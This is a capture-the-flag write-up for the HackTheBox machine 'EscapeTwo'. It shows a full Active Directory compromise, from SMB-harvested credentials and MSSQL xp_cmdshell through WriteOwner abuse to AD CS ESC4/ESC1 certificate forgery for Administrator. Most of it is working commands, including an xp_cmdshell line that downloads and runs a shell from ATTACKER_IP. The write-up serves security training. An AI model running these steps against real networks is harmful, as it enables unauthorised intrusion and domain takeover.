# HackTheBox — EscapeTwo

**Difficulty:** Medium  
**OS:** Windows  
**Category:** Active Directory  
**IP:** 10.129.173.12  
**Domain:** sequel.htb  
**DC:** DC01.sequel.htb

---

## Summary

EscapeTwo is a Windows Active Directory machine that simulates a realistic corporate pentest scenario. Starting with low-privileged domain credentials, the attack chain progresses through SMB enumeration, MSSQL credential discovery via Excel files left on a share, lateral movement via password reuse, and privilege escalation through AD CS (Active Directory Certificate Services) abuse — specifically ESC4 leading to ESC1 exploitation via a misconfigured certificate template.

---

## Attack Chain Overview

```
rose (given creds)
  → SMB share enumeration → accounts.xlsx → sa MSSQL creds
    → MSSQL xp_cmdshell as sql_svc
      → SQL installer INI → sql_svc plaintext password
        → Password reuse → ryan WinRM
          → WriteOwner on ca_svc → GenericAll → password change
            → ESC4 on DunderMifflinAuthentication template
              → Modify template → ESC1 → cert as Administrator
                → PKINIT → NT hash → WinRM as Administrator
```

---

## Reconnaissance

### Port Scan

```bash
nmap -Pn -n -p- -sVC 10.129.173.12 -oA tcp_all_ports
```

Key open ports:

| Port | Service | Notes |
|------|---------|-------|
| 53 | DNS | Simple DNS Plus |
| 88 | Kerberos | Windows Kerberos |
| 139/445 | SMB | Message signing required |
| 389/636/3268/3269 | LDAP | Domain: sequel.htb |
| 1433 | MSSQL | Microsoft SQL Server 2019 RTM |
| 5985 | WinRM | HTTP API |

**Key findings:**
- Domain: `sequel.htb`, DC hostname: `DC01`
- MSSQL 2019 exposed on port 1433
- SMB signing enabled and required (no relay attacks)
- WinRM available on 5985

---

## Initial Access — SMB + MSSQL

### Given Credentials

```
rose : KxEPkKe6R8su
```

### SMB Share Enumeration

```bash
netexec smb 10.129.173.12 -u rose -p 'KxEPkKe6R8su' --shares
```

Non-default shares with READ access:
- `Accounting Department` — custom share, immediately suspicious
- `Users` — default user profiles

### Downloading Files from Accounting Department

```bash
smbclient '//10.129.173.12/Accounting Department' -U 'sequel.htb/rose%KxEPkKe6R8su'
smb: \> mget *
```

Files retrieved:
- `accounting_2024.xlsx` — financial records (no creds)
- `accounts.xlsx` — **credential list**

### Extracting Credentials from accounts.xlsx

xlsx files are zip archives containing XML. The shared strings file holds all cell values:

```bash
unzip -o accounts.xlsx -d accounts_extracted
cat accounts_extracted/xl/sharedStrings.xml | sed 's/<[^>]*>//g'
```

**Output:**

| Username | Password |
|----------|----------|
| angela | 0fwz7Q4mSpurIt99 |
| oscar | 86LxLBMgEWaKUnBG |
| kevin | Md9Wlq1E5bZnVDVo |
| **sa** | **MSSQLP@ssw0rd!** |

The `sa` (SQL Server sysadmin) account password is stored in plaintext.

---

## Foothold — MSSQL RCE as sql_svc

### Connecting as sa

```bash
impacket-mssqlclient sequel.htb/sa:'MSSQLP@ssw0rd!'@10.129.173.12
```

Note: no `-windows-auth` flag — `sa` is a SQL login, not a Windows domain account.

### Verifying Sysadmin and Enabling xp_cmdshell

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');  -- returns 1
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
-- sequel\sql_svc
```

### Getting a Reverse Shell

Delivered a Windows reverse shell executable via HTTP server and executed it via xp_cmdshell:

```sql
EXEC xp_cmdshell 'powershell -c "iwr http://ATTACKER_IP:8080/shell.exe -outfile C:\Windows\Temp\shell.exe; C:\Windows\Temp\shell.exe"';
```

Shell received as `sequel\sql_svc`.

---

## Credential Discovery — SQL Installer INI

While exploring the filesystem as sql_svc, the SQL Server 2019 installer directory contained a configuration file with plaintext credentials:

```bash
type C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI
```

**Key entries:**

```ini
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SAPWD="MSSQLP@ssw0rd!"
```

The `sql_svc` domain account password `WqSZAF6CysDQbGb3` was stored in plaintext in the installer INI file — a common finding in real-world Windows environments where setup files are left on disk post-installation.

---

## Lateral Movement — ryan via Password Reuse

Testing the recovered password against domain users via WinRM:

```bash
netexec winrm 10.129.173.12 -u ryan -p 'WqSZAF6CysDQbGb3'
# [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 (Pwn3d!)
```

Ryan reused sql_svc's password. Logged in via Evil-WinRM:

```bash
evil-winrm -i 10.129.173.12 -u ryan -p 'WqSZAF6CysDQbGb3'
```

### User Flag

```
C:\Users\ryan\Desktop\user.txt
```

---

## Privilege Escalation — AD CS ESC4 → ESC1

### AD Enumeration

Kerberoasting enumerated two service accounts with SPNs:
- `sql_svc` — member of SQLRUserGroupSQLEXPRESS
- `ca_svc` — member of **Cert Publishers** (CA-related group)

The `ca_svc` account's recent password reset timestamp and Cert Publishers membership indicated it was the intended escalation path.

### Discovering ryan's ACL over ca_svc

```bash
bloodyAD -u ryan -p 'WqSZAF6CysDQbGb3' -d sequel.htb --host 10.129.173.12 get writable --otype USER
```

Output:
```
CN=Certification Authority,CN=Users,DC=sequel,DC=htb
OWNER: WRITE
```

Ryan (via the **Management Department** group) has **WriteOwner** over `ca_svc`.

### Taking Control of ca_svc

```bash
# Take ownership
bloodyAD -u ryan -p 'WqSZAF6CysDQbGb3' -d sequel.htb --host 10.129.173.12 set owner ca_svc ryan

# Grant GenericAll
bloodyAD -u ryan -p 'WqSZAF6CysDQbGb3' -d sequel.htb --host 10.129.173.12 add genericAll ca_svc ryan

# Reset ca_svc password
bloodyAD -u ryan -p 'WqSZAF6CysDQbGb3' -d sequel.htb --host 10.129.173.12 set password ca_svc 'P@ssw0rd123!'
```

### Enumerating AD CS Vulnerabilities

```bash
certipy find -u ca_svc -p 'P@ssw0rd123!' -dc-ip 10.129.173.12 -stdout -vulnerable
```

**Findings:**

- CA: `sequel-DC01-CA` on `DC01.sequel.htb`
- Vulnerable template: **DunderMifflinAuthentication**
- Vulnerability: **ESC4** — `ca_svc` (via Cert Publishers) has Full Control over the template
- The template had `SubjectAltRequireDns` flag set, preventing direct UPN-based enrollment

### Exploiting ESC4 → ESC1

ESC4 means a principal has dangerous write permissions over a certificate template. The attack converts ESC4 into ESC1 by modifying the template to allow enrollees to supply an arbitrary Subject Alternative Name (SAN).

**Step 1 — Save the current template configuration:**

```bash
certipy template -u ca_svc -p 'P@ssw0rd123!' -dc-ip 10.129.173.12 \
  -template DunderMifflinAuthentication -save-configuration DunderMifflinAuthentication.json
```

**Step 2 — Apply default (ESC1-vulnerable) configuration:**

```bash
certipy template -u ca_svc -p 'P@ssw0rd123!' -dc-ip 10.129.173.12 \
  -template DunderMifflinAuthentication -write-default-configuration
```

This sets `msPKI-Certificate-Name-Flag: 1` (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT), enabling arbitrary SAN specification.

**Step 3 — Request a certificate as Administrator:**

```bash
certipy req -u ryan -p 'WqSZAF6CysDQbGb3' -dc-ip 10.129.173.12 \
  -ca sequel-DC01-CA -template DunderMifflinAuthentication \
  -upn administrator@sequel.htb
# [*] Got certificate with UPN 'administrator@sequel.htb'
# [*] Saved to 'administrator.pfx'
```

Note: ryan was used for the request since ca_svc's RPC enrollment returned access denied. After the template modification, Authenticated Users could enroll.

**Step 4 — Authenticate with the certificate (PKINIT):**

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.173.12 -domain sequel.htb
# [*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

### Domain Admin Shell

```bash
evil-winrm -i 10.129.173.12 -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
```

### Root Flag

```
C:\Users\Administrator\Desktop\root.txt
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning and service enumeration |
| netexec | SMB/LDAP/MSSQL/WinRM authentication and enumeration |
| impacket-mssqlclient | MSSQL interaction |
| impacket-GetUserSPNs | Kerberoasting |
| bloodhound-python | AD graph collection |
| bloodyAD | LDAP ACL manipulation |
| certipy-ad | AD CS enumeration and exploitation |
| evil-winrm | WinRM shell |
| hashcat | Offline hash cracking |

---

## Key Takeaways

- **Sensitive files on SMB shares** — The `accounts.xlsx` file containing plaintext credentials (including the SA account) was accessible to a low-privileged user. In real environments, file shares frequently contain credentials left by administrators.

- **SQL installer files** — The `sql-Configuration.INI` file left in `C:\SQL2019\` contained the MSSQL service account password and SA password in plaintext. These files should be removed after installation.

- **Password reuse** — The sql_svc service account password was reused by the ryan domain user, enabling lateral movement via WinRM.

- **WriteOwner ACL abuse** — Ryan's WriteOwner right over ca_svc (through the Management Department group) allowed full takeover of the CA service account — a non-obvious but high-impact ACL edge.

- **AD CS ESC4** — Cert Publishers having Full Control over certificate templates is dangerous. ESC4 allows modifying template attributes to introduce ESC1 conditions, enabling impersonation of any domain user including Administrator via PKINIT authentication.
